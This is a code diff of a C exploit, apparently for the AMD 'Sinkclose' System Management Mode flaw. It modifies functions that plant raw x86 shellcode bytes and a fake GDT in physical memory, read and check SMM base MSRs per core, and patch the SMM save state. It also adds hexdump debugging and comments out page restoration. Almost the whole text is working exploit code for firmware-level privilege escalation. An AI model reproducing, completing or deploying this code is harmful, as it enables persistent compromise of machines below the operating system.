@@ -17,8 +17,10 @@ extern "C" {
 	void _core0_shell();
 }
 
-#define DUMP_TSEG 1
-//#define SQUIRREL_DEBUG      1
+void hexdump(const char *data, size_t size, uint64_t offset);
+
+// #define DUMP_TSEG 1
+// #define SQUIRREL_DEBUG      1
 // #define INSTALL_FCH_SMI_HANDLER 1
 // #define INSTALL_ROOT_SMI_HANDLER 1
 
@@ -51,6 +53,8 @@ extern "C" {
 #define PG_STACK_ENTRY          0x1EF
 #define PG_AUX_DATA_ENTRY       0x1FF
 
+
+#define CORENUM 16
 /*
 >>> print_idxs(0xfffff6fb7dbff000)
 pte-i : 1ff
@@ -470,12 +474,14 @@ void prepare_shellcode_core0(UINT32 smi_entry_point) {
     UINT32 sh_len = (UINT64)ptr -  (UINT64)_core0_shell;    
     printf("core0_shell is %d bytes long\n", sh_len);
 
-    printf("copying core0_shell to physical address %08x\n", CORE0_SHELLCODE_ADDRESS);
-
     char* shellcode_page = (char *)map_physical_memory(CORE0_SHELLCODE_ADDRESS, PAGE_SIZE);
+    
+    printf("copying core0_shell to physical address %08x\n", CORE0_SHELLCODE_ADDRESS);
+    
     // Copy 32bit Core0_shell
     memcpy(shellcode_page, (void *) _core0_shell, sh_len);
 
+    // Write to the mapped region
 
     // Create a copy of the GDT at offset ORIGINAL_GDT_OFFSET 
     // This is used by core0_shell to reload the gdt and have clean flat descriptors
@@ -490,13 +496,14 @@ void prepare_shellcode_core0(UINT32 smi_entry_point) {
     *(UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) = sizeof(FAKE_GDT) - 1;
     *(UINT32 *)((UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) + 1) = ORIGINAL_GDT;
     
+    hexdump(shellcode_page, 0x1000, CORE0_SHELLCODE_ADDRESS);
 
     unmap_physical_memory(shellcode_page, PAGE_SIZE);
 }
 
 
 /// @brief  Copies the shellcode at CORE1_SHELLCODE_ADDRESS
-void prepare_shellcode_core1(UINT32 smm_save_state_area) {
+void prepare_shellcode_core1(UINT32 smm_save_state_area, UINT64 address) {
         char shellcode_core1[] =
         // Clear TClose
         "\xb9\x13\x01\x01\xc0" 						// mov ecx,0xc0010113
@@ -559,8 +566,8 @@ void prepare_shellcode_core1(UINT32 smm_save_state_area) {
 
 
         // Write to BAR buffer
-        "\xB9\x11\x00\x80\xD0"                      // mov    ecx,0xd0800011
-        "\xC6\x01\x69"                              // mov    BYTE PTR [ecx],0x69
+        "\x90\x90\x90\x90\x90"                      // mov    ecx,0xd0800011
+        "\x90\x90\x90"                              // mov    BYTE PTR [ecx],0x69
 
         // // loop
         // "\xa1\x20\x32\x00\x00"                      // mov    eax,ds:0x3220
@@ -605,8 +612,9 @@ void prepare_shellcode_core1(UINT32 smm_save_state_area) {
     //      smm_save_state_area + SMM_SAVE_STATE__OFFSET_AUTO_HALT_RESTART;
 
 
-    void* shellcode_page = map_physical_memory(CORE1_SHELLCODE_ADDRESS, PAGE_SIZE);
+    void* shellcode_page = map_physical_memory(address, PAGE_SIZE);
     memcpy(shellcode_page, shellcode_core1, sizeof(shellcode_core1) - 1);
+    hexdump((char *)shellcode_page, sizeof(shellcode_core1)-1, address);
     unmap_physical_memory(shellcode_page, PAGE_SIZE);
 }
 
@@ -1031,22 +1039,76 @@ UINT32 get_smi_handler_size() {
     return section_size;
 }
 
+// Function to print a hexdump of a char array
+void hexdump(const char *data, size_t size, uint64_t offset) {
+    const size_t bytes_per_line = 16; // Number of bytes to display per line
+    for (size_t i = 0; i < size; i += bytes_per_line) {
+        printf("%016zx;  ", i+offset); // Print the offset
+
+        // Print the hex values for this line
+        for (size_t j = 0; j < bytes_per_line; j++) {
+            if (i + j < size) {
+                printf("%02x ", (unsigned char)data[i + j]);
+            } else {
+                printf("   "); // Pad with spaces if we are at the end
+            }
+        }
+
+        printf(" |"); // Separator between hex and ASCII
+
+        // Print the ASCII representation for this line
+        for (size_t j = 0; j < bytes_per_line; j++) {
+            if (i + j < size) {
+                char c = data[i + j];
+                printf("%c", isprint((unsigned char)c) ? c : '.');
+            } else {
+                printf(" "); // Pad with spaces if we are at the end
+            }
+        }
+
+        printf("|\n");
+    }
+}
+
+extern void amd_print_smm_tseg_addr_for_core(int core);
+
 void sinkclose_exploit()
 {
     BOOL res;
 
     // Get SMM base location
     UINT64 smm_base_core0 = 0;
+    UINT64 smm_base_core_sec = 0;
     do_read_msr_for_core(0, AMD_MSR_SMM_BASE_ADDRESS, &smm_base_core0);
-    
+    printf("SMM Base for Core0: %016llx\n", smm_base_core0);
+    do_read_msr_for_core(CORENUM, AMD_MSR_SMM_BASE_ADDRESS, &smm_base_core_sec);
+    printf("SMM Base for Core_sec: %016llx\n", smm_base_core_sec);
+
     UINT64 smm_base_core1 = smm_base_core0 + SMM_BASE_DISTANCE;
+
+    printf("%016llx || %016llx\n", smm_base_core1, smm_base_core_sec);
+    if(smm_base_core1 != smm_base_core_sec) {
+        printf("SMM Base for Core1 is not as expected, make sure to select the correct thread sibling\n");
+        exit(-1);
+    }
+
+/*     uint64_t smm_tseg_mask = 0x000ffffff800600f;
+    do_write_msr_for_core(0, AMD_MSR_SMM_TSEG_MASK, smm_tseg_mask);
+    for (size_t i = 0; i < 32; i++)
+    {
+        amd_print_smm_tseg_addr_for_core(i);
+    }
+    do_write_msr_for_core(0, AMD_MSR_SMM_TSEG_MASK, 0x000ffffff8006003); */
 
     UINT32 smm_entry_point_core0 = smm_base_core0 + AMD_SMI_HANDLER_ENTRY_POINT;
     UINT32 smm_entry_point_core1 = smm_base_core1 + AMD_SMI_HANDLER_ENTRY_POINT;
 
 
     // Set the fake GDT for core 0 and core 1
+    // 0xaef4b053 = smm_entry_point_core0 + 0x53
     UINT32 gdt_cs_base = 0x100000000 - (smm_entry_point_core0 + 0x53) + CORE0_SHELLCODE_ADDRESS;
+    printf("GDT cs_base: 0x%08x\n", gdt_cs_base);
+    printf("GDT cs_base + jump offset (overflow 32 bit): 0x%08lx\n", gdt_cs_base + (smm_entry_point_core0 + 0x53));
     
     void* gdt_physpage = map_physical_memory(0x00000000, PAGE_SIZE);
 
@@ -1054,7 +1116,12 @@ void sinkclose_exploit()
     char *gdt = (char *) malloc(sizeof(FAKE_GDT));
     memcpy(gdt, FAKE_GDT, sizeof(FAKE_GDT));
     updateGDTBase((unsigned char *) gdt, 1, gdt_cs_base);
+    // +1 for the alignment since we GDTR is at 0xFFFFFFFF
     memcpy((char*)gdt_physpage, gdt + 1, sizeof(FAKE_GDT) - 1);
+    
+    printf("Hexdump GDT\n");
+    hexdump((char*)gdt_physpage, 0x60, 0x00000000);
+
     free(gdt);
 
     unmap_physical_memory(gdt_physpage, PAGE_SIZE);
@@ -1070,8 +1137,8 @@ void sinkclose_exploit()
 
     // This shellcode needs to patch the Save State Area
     // for graceful return
-    prepare_shellcode_core1(smm_base_core1 + AMD_SMM_STATE_SAVE_AREA);
-
+    prepare_shellcode_core1(smm_base_core1 + AMD_SMM_STATE_SAVE_AREA, CORE1_SHELLCODE_ADDRESS);
+    //prepare_shellcode_core1(smm_base_core0 + AMD_SMM_STATE_SAVE_AREA, CORE0_SHELLCODE_ADDRESS);
 
     // Prepare recursive paging structure    
 
@@ -1208,12 +1275,11 @@ void enable_squirrel() {
 
 
 void run_exploit() {
-
     // Save content of physical pages used   
-    void *p0 = map_physical_memory(0x00000000, PAGE_SIZE);
-    void *p1 = map_physical_memory(0x00001000, PAGE_SIZE);    
-    void *p2 = map_physical_memory(0x00002000, PAGE_SIZE);  
-    void *p3 = map_physical_memory(0x00003000, PAGE_SIZE);
+/*     void *p0 = map_physical_memory(GDT_SINKCLOSE_ADDRESS, PAGE_SIZE);
+    void *p1 = map_physical_memory(CORE0_SHELLCODE_ADDRESS, PAGE_SIZE);    
+    void *p2 = map_physical_memory(CORE0_PML4, PAGE_SIZE);  
+    void *p3 = map_physical_memory(CORE1_SHELLCODE_ADDRESS, PAGE_SIZE);
 
     void *px[] = { p0, p1, p2, p3 };
 
@@ -1224,20 +1290,19 @@ void run_exploit() {
     for (int i = 0 ; i < pages_used; i++) {
         memcpy(&buff[PAGE_SIZE * i], px[i], PAGE_SIZE);
         memset(px[i], 0, PAGE_SIZE);
-    }
+    } */
 
     ////
     //
     // Execute exploit
     sinkclose_exploit();
-
     /// Restore physical pages content
-    for (int i = 0 ; i < pages_used; i++) {
+/*     for (int i = 0 ; i < pages_used; i++) {
         memcpy(px[i], &buff[PAGE_SIZE * i], PAGE_SIZE);
         unmap_physical_memory(px[i], PAGE_SIZE); 
-    } 
+    }  *
 
-    free(buff);
+    free(buff);*/
 }
 
 
